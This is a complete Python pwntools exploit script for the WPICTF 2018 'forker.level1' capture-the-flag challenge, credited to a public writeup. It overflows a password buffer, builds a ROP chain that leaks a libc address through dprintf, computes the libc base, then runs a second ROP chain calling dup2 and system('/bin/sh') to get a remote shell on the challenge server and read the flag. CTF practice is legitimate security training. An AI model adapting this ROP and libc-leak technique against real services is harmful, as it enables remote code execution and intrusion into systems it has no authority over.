#!/usr/bin/env python2

# Solution from https://www.da.vidbuchanan.co.uk/blog/WPICTF-2018-forker-writeup.html

from pwn import *
context.clear(arch="amd64")

TESTING = False

SOCKFD = 4


elf = ELF("./forker.level1")

if TESTING:
    libc = ELF("/usr/lib/libc.so.6")
else:
    libc = ELF("./libc-2.26.so")


def get_server():
    if TESTING:
        return remote("localhost", 31337)
    else:
        return remote("forker1.wpictf.xyz", 31337)


def do_rop(srv, rop):
    payload = chr(76+4+8)*77    # overwrite index var with offset of return address
    payload += rop

    assert("\n" not in payload) # this would break things

    srv.recvuntil("Password:")
    srv.sendline(payload)


def leak_mem(addr):
    srv = get_server()

    rop = ROP(elf, badchars="\n")
    rop.dprintf(SOCKFD, addr)

    log.info("memleak ROP:")
    print rop.dump()

    do_rop(srv, str(rop))

    resp = srv.clean(timeout=1)
    srv.close()

    return resp


# STAGE 1: leak libc address

libc_read = u64(leak_mem(elf.got["read"]) + "\0\0") # libc addresses end with 2 nulls
log.info("libc_read = " + hex(libc_read))

libc.address = libc_read - libc.sym["read"]
log.info("libc base = " + hex(libc.address))

# STAGE 2: ROP to victory

rop = ROP(libc, badchars="\n")
rop.dup2(SOCKFD, 0)
rop.dup2(SOCKFD, 1)
rop.dup2(SOCKFD, 2)
rop.system(next(libc.search("/bin/sh")))

log.info("system() ROP:")
print rop.dump()

srv = get_server()
do_rop(srv, str(rop))
srv.interactive()

srv.sendline("cat flag.txt")
srv.interactive()
